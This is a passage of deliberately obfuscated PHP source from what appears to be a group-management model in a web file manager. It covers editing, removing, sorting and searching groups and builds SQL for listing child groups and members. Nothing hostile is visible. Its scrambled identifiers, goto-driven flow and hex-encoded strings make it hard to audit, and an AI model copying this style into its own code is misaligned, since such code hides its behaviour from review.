array($cÒŞ¥Ê¶Ø‚[2169] => $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2169]], $cÒŞ¥Ê¶Ø‚[2170] => $CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2170]])); unset($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2169]]); unset($CÓ·Ú½²Ü [$cÒŞ¥Ê¶Ø‚[2170]]); } Model($cÒŞ¥Ê¶Ø‚[1110])->groupRootAdd($eäÙì‰–­†); return $eäÙì‰–­†; goto c½ì‚æ©ä; c½ì‚æ©ä: } protected function groupEdit($E•ÈÄ¨‚Ğ´, $BÏŞ¨š´ö) { $A·ØËˆæ¨ =& $_SERVER[Î¿—”òá]; if (!empty($BÏŞ¨š´ö[$A·ØËˆæ¨[461]])) { $EŒÔ—¶°¬Ó = $this->getInfoSimple($E•ÈÄ¨‚Ğ´); $dÔ°²²³Á… = $this->getInfoSimple($BÏŞ¨š´ö[$A·ØËˆæ¨[461]]); if (!$EŒÔ—¶°¬Ó || !$dÔ°²²³Á…) { return !1; } if ($EŒÔ—¶°¬Ó[$A·ØËˆæ¨[2097]] == $dÔ°²²³Á…[$A·ØËˆæ¨[2097]]) { return !1; } if ($BÏŞ¨š´ö[$A·ØËˆæ¨[461]] != $EŒÔ—¶°¬Ó[$A·ØËˆæ¨[461]]) { if ($dÔ°²²³Á…[$A·ØËˆæ¨[459]] !== $EŒÔ—¶°¬Ó[$A·ØËˆæ¨[459]] && strpos($dÔ°²²³Á…[$A·ØËˆæ¨[459]], $EŒÔ—¶°¬Ó[$A·ØËˆæ¨[459]] . $EŒÔ—¶°¬Ó[$A·ØËˆæ¨[2097]] . $A·ØËˆæ¨[47]) === 0) { return !1; } $BÏŞ¨š´ö[$A·ØËˆæ¨[525]] = $dÔ°²²³Á…[$A·ØËˆæ¨[459]] . $BÏŞ¨š´ö[$A·ØËˆæ¨[461]] . $A·ØËˆæ¨[47]; $this->_changeChildLevel($EŒÔ—¶°¬Ó, $dÔ°²²³Á…); } } if (isset($BÏŞ¨š´ö[$A·ØËˆæ¨[28]])) { $this->setNamePinyin($E•ÈÄ¨‚Ğ´, $BÏŞ¨š´ö[$A·ØËˆæ¨[28]]); } if (isset($BÏŞ¨š´ö[$A·ØËˆæ¨[2169]])) { $this->metaSet($E•ÈÄ¨‚Ğ´, array($A·ØËˆæ¨[2169] => $BÏŞ¨š´ö[$A·ØËˆæ¨[2169]], $A·ØËˆæ¨[2170] => $BÏŞ¨š´ö[$A·ØËˆæ¨[2170]])); unset($BÏŞ¨š´ö[$A·ØËˆæ¨[2169]]); unset($BÏŞ¨š´ö[$A·ØËˆæ¨[2170]]); } return $this->where(array($A·ØËˆæ¨[2171] => $E•ÈÄ¨‚Ğ´))->save($BÏŞ¨š´ö); } private function _changeChildLevel($eÍª«Æ×Æ, $c—³Ç­¾›í, $Dôâáá¨¦ö = false) { goto câŠ½±ñà; Aµ£ˆçà‚±: if ($Dôâáá¨¦ö) { $d·µ£’—¨ô = $c—³Ç­¾›í[$FŠ½ãğá¨Ú[459]] . $c—³Ç­¾›í[$FŠ½ãğá¨Ú[2097]] . $FŠ½ãğá¨Ú[47]; } $BÁ˜‹Éã± = array($FŠ½ãğá¨Ú[525] => array($FŠ½ãğá¨Ú[483], $eÍª«Æ×Æ[$FŠ½ãğá¨Ú[459]] . $eÍª«Æ×Æ[$FŠ½ãğá¨Ú[2097]] . $FŠ½ãğá¨Ú[484])); $D»ˆìÛ¢Â² = array($FŠ½ãğá¨Ú[525] => array($FŠ½ãğá¨Ú[534], "\162\x65\x70\x6c\141\x63\145\x28\160\x61\x72\x65\156\164\x4c\145\x76\145\154\x2c\47{$bÏÀòé×÷}\x27\x2c\47{$d·µ£’—¨ô}\x27\51")); goto EÜ”çÍ„…Û; câŠ½±ñà: $FŠ½ãğá¨Ú =& $_SERVER[Î¿—”òá]; $bÏÀòé×÷ = $eÍª«Æ×Æ[$FŠ½ãğá¨Ú[459]] . $eÍª«Æ×Æ[$FŠ½ãğá¨Ú[2097]] . $FŠ½ãğá¨Ú[47]; $d·µ£’—¨ô = $c—³Ç­¾›í[$FŠ½ãğá¨Ú[459]] . $c—³Ç­¾›í[$FŠ½ãğá¨Ú[2097]] . $FŠ½ãğá¨Ú[47] . $eÍª«Æ×Æ[$FŠ½ãğá¨Ú[2097]] . $FŠ½ãğá¨Ú[47]; goto Aµ£ˆçà‚±; EÜ”çÍ„…Û: $this->where($BÁ˜‹Éã±)->data($D»ˆìÛ¢Â²)->save(); goto c®‘ÒÖ˜Õ; c®‘ÒÖ˜Õ: } public function setNamePinyin($CÔ‹ŸèŠÑŸ, $BñáŒÇÁó = false) { $F ¸®ÕÎ… =& $_SERVER[Î¿—”òá]; if (!$BñáŒÇÁó) { $Bµ·Ù©¸Ì¾ = $this->getInfoSimple($CÔ‹ŸèŠÑŸ); $BñáŒÇÁó = $Bµ·Ù©¸Ì¾[$F ¸®ÕÎ…[28]]; } if (!Input::check($BñáŒÇÁó, $F ¸®ÕÎ…[528])) { $this->metaSet($CÔ‹ŸèŠÑŸ, $F ¸®ÕÎ…[416], null); $this->metaSet($CÔ‹ŸèŠÑŸ, $F ¸®ÕÎ…[415], null); return; } $fİ¥íªÎô“ = array($F ¸®ÕÎ…[416] => str_replace($F ¸®ÕÎ…[50], $F ¸®ÕÎ…[33], Pinyin::encode($BñáŒÇÁó)), $F ¸®ÕÎ…[415] => Pinyin::encode($BñáŒÇÁó, $F ¸®ÕÎ…[529])); $this->metaSet($CÔ‹ŸèŠÑŸ, $fİ¥íªÎô“); } protected function groupStatus($F°¬½¬Ö‡ì, $dÅŠÜÙè¨¬) { goto c³Ù™ê»×; a·Œ®®áÂ¤: if ($dÅŠÜÙè¨¬ == $cãøÉè—[83]) { $f‹ëª³àÛ = $this->parentLevelArray($EšÅÔğ½ó [$cãøÉè—[459]]); } else { $f…•¾ÑÂ” = array($cãøÉè—[525] => array($cãøÉè—[483], $EšÅÔğ½ó [$cãøÉè—[459]] . $EšÅÔğ½ó [$cãøÉè—[2097]] . $cãøÉè—[484])); $f‹ëª³àÛ = $this->where($f…•¾ÑÂ”)->field($cãøÉè—[2097])->select(); $f‹ëª³àÛ = array_to_keyvalue($f‹ëª³àÛ, $cãøÉè—[33], $cãøÉè—[2097]); } $f‹ëª³àÛ[] = $EšÅÔğ½ó [$cãøÉè—[2097]]; $fÀƒÚÂŒ•è = array(); goto eÁâÆ‰©æŠ; eÁâÆ‰©æŠ: foreach ($f‹ëª³àÛ as $F°¬½¬Ö‡ì) { $fÀƒÚÂŒ•è[] = array($cãøÉè—[2097] => $F°¬½¬Ö‡ì, $cãøÉè—[89] => $cãøÉè—[685], $cãøÉè—[359] => $dÅŠÜÙè¨¬); } return Model($cãøÉè—[2172])->addAll($fÀƒÚÂŒ•è, array(), !0); goto e…Î¦ƒ³; c³Ù™ê»×: $cãøÉè— =& $_SERVER[Î¿—”òá]; $EšÅÔğ½ó  = $this->getInfoSimple($F°¬½¬Ö‡ì); if (!$EšÅÔğ½ó ) { return !1; } goto a·Œ®®áÂ¤; e…Î¦ƒ³: } private function _groupStatusApply($fØ­Áô¦°„, $aÜàÔØ¨¾·) { $DÈ²£µ±Ò¸ =& $_SERVER[Î¿—”òá]; if ($aÜàÔØ¨¾· == $DÈ²£µ±Ò¸[83]) { $e¨Šº¶Á‚ª = $this->parentLevelArray($fØ­Áô¦°„[$DÈ²£µ±Ò¸[459]]); } else { $cèåå¦Çƒé = array($DÈ²£µ±Ò¸[525] => array($DÈ²£µ±Ò¸[483], $fØ­Áô¦°„[$DÈ²£µ±Ò¸[459]] . $fØ­Áô¦°„[$DÈ²£µ±Ò¸[2097]] . $DÈ²£µ±Ò¸[484])); $e¨Šº¶Á‚ª = $this->where($cèåå¦Çƒé)->field($DÈ²£µ±Ò¸[2097])->select(); $e¨Šº¶Á‚ª = array_to_keyvalue($e¨Šº¶Á‚ª, $DÈ²£µ±Ò¸[33], $DÈ²£µ±Ò¸[2097]); } if (empty($e¨Šº¶Á‚ª)) { return; } $fá™¬”•¹ = array(); foreach ($e¨Šº¶Á‚ª as $eÚùšî¹„¨) { $fá™¬”•¹[] = array($DÈ²£µ±Ò¸[2097] => $eÚùšî¹„¨, $DÈ²£µ±Ò¸[89] => $DÈ²£µ±Ò¸[685], $DÈ²£µ±Ò¸[359] => $aÜàÔØ¨¾·); } Model($DÈ²£µ±Ò¸[2172])->addAll($fá™¬”•¹, array(), !0); } protected function groupRemove($DáŒ‰°áÁ­) { goto A­‡–²à² ; FÇ‰Ş®‡Éà: $this->where(array($dÆ¢æ·Ó™†[461] => $DáŒ‰°áÁ­))->save(array($dÆ¢æ·Ó™†[461] => $d‹Ã­âªÕ­[$dÆ¢æ·Ó™†[461]])); Model($dÆ¢æ·Ó™†[2172])->where($Eë„œ¸ªŞ)->delete(); Model($dÆ¢æ·Ó™†[2173])->where($Eë„œ¸ªŞ)->delete(); goto d‡Éîğµ±®; aÍÏ²ßõ‡Â: if (!$d‹Ã­âªÕ­ || $d‹Ã­âªÕ­[$dÆ¢æ·Ó™†[461]] == 0) { return !1; } $CªíŸÎ…ßÌ = $this->getInfoSimple($d‹Ã­âªÕ­[$dÆ¢æ·Ó™†[461]]); $this->_changeChildLevel($d‹Ã­âªÕ­, $CªíŸÎ…ßÌ, !0); goto FÇ‰Ş®‡Éà; d‡Éîğµ±®: Model($dÆ¢æ·Ó™†[749])->groupRootRemove($DáŒ‰°áÁ­); return $this->where($Eë„œ¸ªŞ)->delete(); goto BÃÄ¨‰»; A­‡–²à² : $dÆ¢æ·Ó™† =& $_SERVER[Î¿—”òá]; $Eë„œ¸ªŞ = array($dÆ¢æ·Ó™†[2097] => $DáŒ‰°áÁ­); $d‹Ã­âªÕ­ = $this->where($Eë„œ¸ªŞ)->find(); goto aÍÏ²ßõ‡Â; BÃÄ¨‰»: } protected function groupSort($b±¿ËŸ¬±½) { $C„ìÂÉÒ²Ğ =& $_SERVER[Î¿—”òá]; $D—‹‰ˆâµ = array(); foreach ($b±¿ËŸ¬±½ as $fˆ¢ö¼µ´ => $a…Ìí­ç™å) { $D—‹‰ˆâµ[] = array($C„ìÂÉÒ²Ğ[2097], $a…Ìí­ç™å, $C„ìÂÉÒ²Ğ[2118], $fˆ¢ö¼µ´ + 1); } $this->saveAll($D—‹‰ˆâµ); } public function listData() { $EºŞÒ…ÒËÉ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EºŞÒ…ÒËÉ[$_SERVER[Î¿—”òá][354]]); return $EºŞÒ…ÒËÉ; } private function _makeOrder($FÙòî¥£Ï = '') { goto FâÌŠ¥•çì; FâÌŠ¥•çì: $bĞœ§ğ††­ =& $_SERVER[Î¿—”òá]; $EÃƒ“†™‰ = array($bĞœ§ğ††­[2097], $bĞœ§ğ††­[28], $bĞœ§ğ††­[2083], $bĞœ§ğ††­[187]); $b×†¼Ò É = array($bĞœ§ğ††­[402] => $bĞœ§ğ††­[403], $bĞœ§ğ††­[404] => $bĞœ§ğ††­[405]); goto Bë´‚Ãš¸; cÜáœÚôêĞ: $FÙòî¥£Ï = $FÙòî¥£Ï . "{$A›œâĞùÓî}\40{$b½Ãß’»¯Ô}\x2c\40\x67\162\157\165\160\x49\x44\40\141\x73\143"; return $this->order($FÙòî¥£Ï); goto f«Å…‰õ‰; Bë´‚Ãš¸: $A›œâĞùÓî = Input::get($bĞœ§ğ††­[407], $bĞœ§ğ††­[7], $bĞœ§ğ††­[2101], $EÃƒ“†™‰); $b½Ãß’»¯Ô = Input::get($bĞœ§ğ††­[408], $bĞœ§ğ††­[7], $bĞœ§ğ††­[2174], array($bĞœ§ğ††­[2174], $bĞœ§ğ††­[404])); $b½Ãß’»¯Ô = $b×†¼Ò É[$b½Ãß’»¯Ô]; goto cÜáœÚôêĞ; f«Å…‰õ‰: } public function listChild($cÓÁĞ¡èã) { $A–¥œÁ­Ÿ =& $_SERVER[Î¿—”òá]; $aäãÑŞôè¾ = $this->where(array($A–¥œÁ­Ÿ[461] => $cÓÁĞ¡èã))->_makeOrder()->selectPage(200); $this->_listDataApply($aäãÑŞôè¾[$A–¥œÁ­Ÿ[354]]); return $aäãÑŞôè¾; } public function listByID($dÄ¥ëÏ«ñ) { $dŞÕìæÛ =& $_SERVER[Î¿—”òá]; if (!$dÄ¥ëÏ«ñ) { return array(); } $bÛí—ì‹Ä˜ = array($dŞÕìæÛ[2097] => array($dŞÕìæÛ[7], $dÄ¥ëÏ«ñ)); $FÂÁ…´‡ß« = $this->where($bÛí—ì‹Ä˜)->select(); $this->_listDataApply($FÂÁ…´‡ß«); return $FÂÁ…´‡ß«; } public function listSearch($FåòùªÍË) { goto eï©™©µ; eï©™©µ: $b“„ã¾Á•Õ =& $_SERVER[Î¿—”òá]; $bŠË‰Éßà = $FåòùªÍË[$b“„ã¾Á•Õ[2175]]; $B¨Ïàô…½Ï = isset($FåòùªÍË[$b“„ã¾Á•Õ[2176]]) ? $FåòùªÍË[$b“„ã¾Á•Õ[2176]] : !1; goto d©õàå•²Ñ; BÎÎŞãš×ã: if ($B¨Ïàô…½Ï) { $cŞ‡Š×ßÀ = $this->getInfoSimple($B¨Ïàô…½Ï); $açàŠë»ê = $cŞ‡Š×ßÀ[$b“„ã¾Á•Õ[459]] . $B¨Ïàô…½Ï . $b“„ã¾Á•Õ[484]; $eÈËóÅ´ùÀ = array($eÈËóÅ´ùÀ, array($b“„ã¾Á•Õ[459] => array($b“„ã¾Á•Õ[748], $açàŠë»ê))); } $FšÉ‡‰³ = $this->_makeOrder()->where($eÈËóÅ´ùÀ)->selectPage(20); $FšÉ‡‰³ = $FšÉ‡‰³ ? $FšÉ‡‰³ : array(); goto b­â†¦Ì; d©õàå•²Ñ: if (!trim($bŠË‰Éßà)) { return !1; } $bŠË‰Éßà = str_replace($b“„ã¾Á•Õ[2177], $b“„ã¾Á•Õ[2178], $bŠË‰Éßà); $eÈËóÅ´ùÀ = array($b“„ã¾Á•Õ[2097] => array($b“„ã¾Á•Õ[748], "\45{$bŠË‰Éßà}\45"), $b“„ã¾Á•Õ[28] => array($b“„ã¾Á•Õ[748], "\45{$bŠË‰Éßà}\x25"), $b“„ã¾Á•Õ[907] => $b“„ã¾Á•Õ[2179]); goto BÎÎŞãš×ã; b­â†¦Ì: if (!$FšÉ‡‰³ || count($FšÉ‡‰³[$b“„ã¾Á•Õ[354]]) < 5 && Input::check($bŠË‰Éßà, $b“„ã¾Á•Õ[306])) { goto fæÆ†Ê¤­†; AöîºÔ‘ß: $D°­†²Ş = array_merge($DßÓ˜ÊÅ¢Á, $f«¾‚Õ•È, $FšÉ‡‰³[$b“„ã¾Á•Õ[354]]); $FšÉ‡‰³[$b“„ã¾Á•Õ[354]] = array_unique_by_key($D°­†²Ş, $b“„ã¾Á•Õ[2097]); $FšÉ‡‰³[$b“„ã¾Á•Õ[351]][$b“„ã¾Á•Õ[352]] = count($FšÉ‡‰³[$b“„ã¾Á•Õ[354]]); goto BĞ†ÎÍÈš; fæÆ†Ê¤­†: $d“İôÔö¡ = $this->groupChildrenAll($B¨Ïàô…½Ï); $DßÓ˜ÊÅ¢Á = $this->_searchFromMeta($b“„ã¾Á•Õ[415], $bŠË‰Éßà, 10, $d“İôÔö¡); $f«¾‚Õ•È = $this->_searchFromMeta($b“„ã¾Á•Õ[416], $bŠË‰Éßà, 10, $d“İôÔö¡); goto AöîºÔ‘ß; BĞ†ÎÍÈš: $FšÉ‡‰³[$b“„ã¾Á•Õ[351]][$b“„ã¾Á•Õ[353]] = ceil($FšÉ‡‰³[$b“„ã¾Á•Õ[351]][$b“„ã¾Á•Õ[352]] / $FšÉ‡‰³[$b“„ã¾Á•Õ[351]][$b“„ã¾Á•Õ[349]]); goto a´ŒÇÓÎ£„; a´ŒÇÓÎ£„: } $this->_listDataApply($FšÉ‡‰³[$b“„ã¾Á•Õ[354]]); return $FšÉ‡‰³; goto f ´ŸĞ½¦; f ´ŸĞ½¦: } protected function groupChildrenAll($bÔò£¸ÈØ) { $Cˆ„‡­•¨ =& $_SERVER[Î¿—”òá]; if (!$bÔò£¸ÈØ) { return !1; } if (is_string($bÔò£¸ÈØ)) { $bÔò£¸ÈØ = array($bÔò£¸ÈØ); } $AÚÂ•¦¬¨ = $bÔò£¸ÈØ; foreach ($bÔò£¸ÈØ as $AğÚä‡ïŠ) { $E„È‰Ş‹µ = $this->getInfoSimple($AğÚä‡ïŠ); $F’Òåº´°‰ = array($Cˆ„‡­•¨[459] => array($Cˆ„‡­•¨[748], $E„È‰Ş‹µ[$Cˆ„‡­•¨[459]] . $AğÚä‡ïŠ . $Cˆ„‡­•¨[484])); $FÒÕÍÈ‹Á = $this->field($Cˆ„‡­•¨[2097])->where($F’Òåº´°‰)->select(); $AÚÂ•¦¬¨ = array_merge($AÚÂ•¦¬¨, array_to_keyvalue($FÒÕÍÈ‹Á, $Cˆ„‡­•¨[33], $Cˆ„‡­•¨[2097])); } return array_unique($AÚÂ•¦¬¨); } private function _searchFromMeta($Cëììõ‰ , $AÖ‹êÍó‹, $b¤²îÛ–, $dŸİÖáÙ¼ä) { goto eß·Éë¼¤‚; A‰”©«’Ş: $d—ŞÜÚá¿Ì = array_to_keyvalue($d—ŞÜÚá¿Ì, $B‰ƒ÷ğª«Ñ[33], $B‰ƒ÷ğª«Ñ[2097]); $F†©Ğ¨…«° = $this->where(array($B‰ƒ÷ğª«Ñ[2171] => array($B‰ƒ÷ğª«Ñ[7], $d—ŞÜÚá¿Ì)))->select(); if (!$F†©Ğ¨…«°) { return array(); } goto fá˜ğß°Í; e¨£ÉÑ‡ “: if ($dŸİÖáÙ¼ä) { $dŒäÎÍ¶Î«[$B‰ƒ÷ğª«Ñ[2097]] = array($B‰ƒ÷ğª«Ñ[7], $dŸİÖáÙ¼ä); } $d—ŞÜÚá¿Ì = Model($B‰ƒ÷ğª«Ñ[2180])->where($dŒäÎÍ¶Î«)->limit($b¤²îÛ–)->select(); if (!$d—ŞÜÚá¿Ì) { return array(); } goto A‰”©«’Ş; eß·Éë¼¤‚: $B‰ƒ÷ğª«Ñ =& $_SERVER[Î¿—”òá]; $AÖ‹êÍó‹ = strtolower($AÖ‹êÍó‹); $dŒäÎÍ¶Î« = array($B‰ƒ÷ğª«Ñ[89] => $Cëììõ‰ , $B‰ƒ÷ğª«Ñ[359] => array($B‰ƒ÷ğª«Ñ[748], "\x25{$AÖ‹êÍó‹}\x25")); goto e¨£ÉÑ‡ “; fá˜ğß°Í: return $F†©Ğ¨…«°; goto e•É§ç÷›Í; e•É§ç÷›Í: } protected function _listDataApplyItem($e–†††ù ®) { $EÂ¸ªã˜¾¸ = array($e–†††ù ®); $this->_listDataApply($EÂ¸ªã˜¾¸); return $EÂ¸ªã˜¾¸[0]; } protected function _listDataApply(&$C´Œìèë×…) { goto fÆŞåøâÕ…; fÆŞåøâÕ…: $BÛ‰°¤¦‡Ä =& $_SERVER[Î¿—”òá]; if (!$C´Œìèë×…) { return; } $FçïâÆò‚ = array_to_keyvalue($C´Œìèë×…, $BÛ‰°¤¦‡Ä[33], $BÛ‰°¤¦‡Ä[2097]); goto e™¸ß¡¼Ú‘; e™¸ß¡¼Ú‘: $this->_listAppendChildren($C´Œìèë×…); $this->_listAppendChildrenMember($C´Œìèë×…); $this->_listAppendMeta($C´Œìèë×…, $FçïâÆò‚); goto dÚˆ¬­ğ„; dÚˆ¬­ğ„: $this->_listAppendParent($C´Œìèë×…); $this->_listAppendSourceRoot($C´Œìèë×…, $FçïâÆò‚); goto EˆÉ‘ÔÆĞí; EˆÉ‘ÔÆĞí: } private function _listAppendChildren(&$c†àÏëÛÃÚ) { goto E¹§÷ï©¡; E¹§÷ï©¡: $AÀ“ã‡Š°ï =& $_SERVER[Î¿—”òá]; $a¸Î©Ìßˆ = $AÀ“ã‡Š°ï[361]; $B‹¡Ö¿ ñ = array(); goto E®Š˜ÕÑ—í; E®Š˜ÕÑ—í: $AáöÈ‹¿¦î = count($c†àÏëÛÃÚ); $E­¨©ìÜñ = $this->tablePrefix . $this->tableName; for ($CŸöŞ„İ®â = 0, $aËŠÓôÑƒ = 0; $CŸöŞ„İ®â < $AáöÈ‹¿¦î; $CŸöŞ„İ®â++) { $aËŠÓôÑƒ++; $aÅğ‚ŞŒ¨Ó = $c†àÏëÛÃÚ[$CŸöŞ„İ®â][$AÀ“ã‡Š°ï[2097]]; $a¸Î©Ìßˆ .= "\123\105\114\105\103\124\x20\52\x20\x46\122\x4f\x4d\40\50\x53\x45\114\105\103\x54\x20\x27{$aÅğ‚ŞŒ¨Ó}\x5f\x63\x68\151\x6c\144\47\40\x61\163\40\x68\141\163\x20\106\x52\117\115\40\x60{$E­¨©ìÜñ}\x60\x20\167\150\145\x72\x65\40\160\141\x72\145\156\164\111\x44\75{$aÅğ‚ŞŒ¨Ó}\x20\154\x69\x6d\151\164\x20\61\51\40\x61\x73\40\x74\x62\x5f{$aÅğ‚ŞŒ¨Ó}\40\165\156\151\157\156\x20\141\154\154\40"; if (($aËŠÓôÑƒ >= 20 || $CŸöŞ„İ®â == $AáöÈ‹¿¦î - 1) && $a¸Î©Ìßˆ) { $a¸Î©Ìßˆ = substr($a¸Î©Ìßˆ, 0, -strlen($AÀ“ã‡Š°ï[449])); $dÁ¸¿†ºÂ = $this->query($a¸Î©Ìßˆ); $B‹¡Ö¿ ñ = array_merge($B‹¡Ö¿ ñ, $dÁ¸¿†ºÂ); $aËŠÓôÑƒ = 0; $a¸Î©Ìßˆ = $AÀ“ã‡Š°ï[33]; } } goto C×ãŒ—İ¤ö; C×ãŒ—İ¤ö: $B‹¡Ö¿ ñ = array_to_keyvalue($B‹¡Ö¿ ñ, $AÀ“ã‡Š°ï[450]); foreach ($c†àÏëÛÃÚ as &$Fƒµá•Š…) { $Fƒµá•Š…[$AÀ“ã‡Š°ï[2181]] = isset($B‹¡Ö¿ ñ[$Fƒµá•Š…[$AÀ“ã‡Š°ï[2097]] . $AÀ“ã‡Š°ï[2182]]); } goto DŸÜ–›®; DŸÜ–›®: } private function _listAppendChildrenMember(&$fÛ±¼§Åª¬) { goto F¿µ®ŸÖÎ; F¿µ®ŸÖÎ: $e¼‘çó„Ü =& $_SERVER[Î¿—”òá]; $dœ¥çš‘ÍĞ = $e¼‘çó„Ü[361]; $fÏ“õëëå = array(); goto cˆ²é¢ùŞÖ; cˆ²é¢ùŞÖ: $D‚Ü‚Å…ù® = count($fÛ±¼§Åª¬); $Cğ°×óÂÚ = $this->tablePrefix . $e¼‘çó„Ü[2173]; for ($CÊ‹ğ‰„Â = 0, $cš÷À§ùŞ = 0; $CÊ‹ğ‰„Â < $D‚Ü‚Å…ù®; $CÊ‹ğ‰„Â++) { $cš÷À§ùŞ++; $eÊïí³Ø‹ = $fÛ±¼§Åª¬[$CÊ‹ğ‰„Â][$e¼‘çó„Ü[2097]]; $dœ¥çš‘ÍĞ .= "\123\105\x4c\x45\103\x54\40\52\x20\x46\122\x4f\115\40\50\123\105\114\105\103\124\x20\47{$eÊïí³Ø‹}\137\x63\x68\151\154\144\47\40\x61\163\x20\150\x61\x73\40\106\x52\117\x4d\x20\140{$Cğ°×óÂÚ}\140\x20\x77\x68\145\x72\145\x20\x67\x72\157\x75\x70\111\x44\75{$eÊïí³Ø‹}\40\x6c\151\x6d\x69\x74\x20\61\x29\40\141\x73\x20\164\142\x5f{$eÊïí³Ø‹}\40\x75\x6e\151\157\156\x20\x61\x6c\154\40"; if (($cš÷À§ùŞ >= 20 || $CÊ‹ğ‰„Â == $D‚Ü‚Å…ù® - 1) && $dœ¥çš‘ÍĞ) { $dœ¥çš‘ÍĞ = substr($dœ¥çš‘ÍĞ, 0, -strlen($e¼‘çó„Ü[449])); $e‹Á›ÂëÙ = $this->query($dœ¥çš‘ÍĞ); $fÏ“õëëå = array_merge($fÏ“õëëå, $e‹Á›ÂëÙ); $cš÷À§ùŞ = 0; $dœ¥çš‘ÍĞ = $e¼‘çó„Ü[33]; } } goto EÇ¤ÀœÚ; EÇ¤ÀœÚ: $fÏ“õëëå = array_to_keyvalue($fÏ“õëëå, $e¼‘çó„Ü[450]); foreach ($fÛ±¼§Åª¬ as &$C¥îë÷Üïø) { $C¥îë÷Üïø[$e¼‘çó„Ü[2183]] = isset($fÏ“õëëå[$C¥îë÷Üïø[$e¼‘çó„Ü[2097]] . $e¼‘çó„Ü[2182]]); } goto C‘ÂÀ×™¡¡; C‘ÂÀ×™¡¡: } private function _listAppendMeta(&$b¾‚çÊÜ, $D« âŠÜâ¬) { $f½—Å„ì…Ì =& $_SERVER[Î¿—”òá]; $D‡™–ª¥¶ = array($f½—Å„ì…Ì[2097] => array($f½—Å„ì…Ì[7], $D« âŠÜâ¬)); $BïÛÈë›‹Á = Model($f½—Å„ì…Ì[2172])->where($D‡™–ª¥¶)->select(); $BïÛÈë›‹Á = array_to_keyvalue_group($BïÛÈë›‹Á, $f½—Å„ì…Ì[2097]); foreach ($BïÛÈë›‹Á as &$b—‹²åôÀÇ) { $b—‹²åôÀÇ = array_to_keyvalue($b—‹²åôÀÇ, $f½—Å„ì…Ì[89], $f½—Å„ì…Ì[359]); } foreach ($b¾‚çÊÜ as &$dŞœÃË‘†á) { $dŞœÃË‘†á[$f½—Å„ì…Ì[417]] = array(); if (isset($BïÛÈë›‹Á[$dŞœÃË‘†á[$f½—Å„ì…Ì[2097]]])) { $dŞœÃË‘†á[$f½—Å„ì…Ì[417]] = $BïÛÈë›‹Á[$dŞœÃË‘†á[$f½—Å„ì…Ì[2097]]]; } } } protected function parentLevelArray($D¡Î¾¤Ç) { $fÕì‰®ŸÔ =& $_SERVER[Î¿—”òá]; $D¡Î¾¤Ç = explode($fÕì‰®ŸÔ[47], trim($D¡Î¾¤Ç, $fÕì‰®ŸÔ[47])); $D¡Î¾¤Ç = array_remove_value($D¡Î¾¤Ç, $fÕì‰®ŸÔ[468]); return $D¡Î¾¤Ç; } private function _listAppendParent(&$FæÌ¼¡î¨ø) { goto D¨ «‹¬ «; D¨ «‹¬ «: $b£¹ƒ í›ï =& $_SERVER[Î¿—”òá]; $dÃ”Äõß‡Ù = array(); foreach ($FæÌ¼¡î¨ø as &$E‰ˆßõ½æ) { $dÃ”Äõß‡Ù[$E‰ˆßõ½æ[$b£¹ƒ í›ï[2097]]] = $E‰ˆßõ½æ[$b£¹ƒ í›ï[28]]; $E–³ĞÒø = $this->parentLevelArray($E‰ˆßõ½æ[$b£¹ƒ í›ï[459]]); foreach ($E–³ĞÒø as $döŞ åÏÒ½) { if (!isset($dÃ”Äõß‡Ù[$döŞ åÏÒ½])) { $dÃ”Äõß‡Ù[$döŞ åÏÒ½] = 0; } } } goto C¿É—×¨Ç; C¿É—×¨Ç: $e¯äĞ¦Ğ“° = array(); foreach ($dÃ”Äõß‡Ù as $B§×¬Âãì³ => $c¹´‹—¨å¡) { if (!$c¹´‹—¨å¡) { $e¯äĞ¦Ğ“°[] = $B§×¬Âãì³; } } if ($e¯äĞ¦Ğ“°) { $cğ‹‘”¬„ = array($b£¹ƒ í›ï[2171] => array($b£¹ƒ í›ï[384], $e¯äĞ¦Ğ“°)); $bÂÛÕòâŒ° = $this->field($b£¹ƒ í›ï[2184])->where($cğ‹‘”¬„)->select(); $f†Ê°º ìê = array_to_keyvalue($bÂÛÕòâŒ°, $b£¹ƒ í›ï[2097], $b£¹ƒ í›ï[28]); $dÃ”Äõß‡Ù = array_merge_index($dÃ”Äõß‡Ù, $f†Ê°º ìê); } goto C¬„Ö¼ÏÊ; C¬„Ö¼ÏÊ: $A×ÚÓô©ßŸ = $GLOBALS[$b£¹ƒ í›ï[6]][$b£¹ƒ í›ï[84]][$b£¹ƒ í›ï[2185]]; foreach ($FæÌ¼¡î¨ø as &$E‰ˆßõ½æ) { $E–³ĞÒø = $this->parentLevelArray($E‰ˆßõ½æ[$b£¹ƒ í›ï[459]]); $AÌ§é‡Óø = $b£¹ƒ í›ï[33]; foreach ($E–³ĞÒø as $B§×¬Âãì³ => $döŞ åÏÒ½) { if ($A×ÚÓô©ßŸ && $B§×¬Âãì³ == 0) { continue; } $AÌ§é‡Óø .= $dÃ”Äõß‡Ù[$döŞ åÏÒ½] . $b£¹ƒ í›ï[8]; } if ($E–³ĞÒø) { $AÌ§é‡Óø .= $E‰ˆßõ½æ[$b£¹ƒ í›ï[28]]; } $E‰ˆßõ½æ[$b£¹ƒ í›ï[463]] = str_replace($b£¹ƒ í›ï[467], $b£¹ƒ í›ï[8], $AÌ§é‡Óø); } goto A•‹Ÿˆ¨±; A•‹Ÿˆ¨±: } private function _listAppendSourceRoot(&$fÖÉÉ†Œ¥’, $C ìÖó¾­) { goto DÑ¨ôóùõ«; b–˜‘–ÆÔ¨: $bÉ„ÂĞâãÕ = Model($cß±ˆƒ˜Ğ¥[749])->order($cß±ˆƒ˜Ğ¥[2187])->field($d¿¶ÄàìŒ‹)->where($BÌÄ…‡¶†²)->select(); $bÉ„ÂĞâãÕ = array_to_keyvalue($bÉ„ÂĞâãÕ, $cß±ˆƒ˜Ğ¥[456]); $bÉ„ÂĞâãÕ = array_remove_key($bÉ„ÂĞâãÕ, $cß±ˆƒ˜Ğ¥[456]); goto c„»Õ®î³; DÑ¨ôóùõ«: $cß±ˆƒ˜Ğ¥ =& $_SERVER[Î¿—”òá]; $BÌÄ…‡¶†² = array($cß±ˆƒ˜Ğ¥[371] => SourceModel::TYPE_GROUP, $cß±ˆƒ˜Ğ¥[461] => 0, $cß±ˆƒ˜Ğ¥[456] => array($cß±ˆƒ˜Ğ¥[7], $C ìÖó¾­)); $d¿¶ÄàìŒ‹ = $cß±ˆƒ˜Ğ¥[2186]; goto 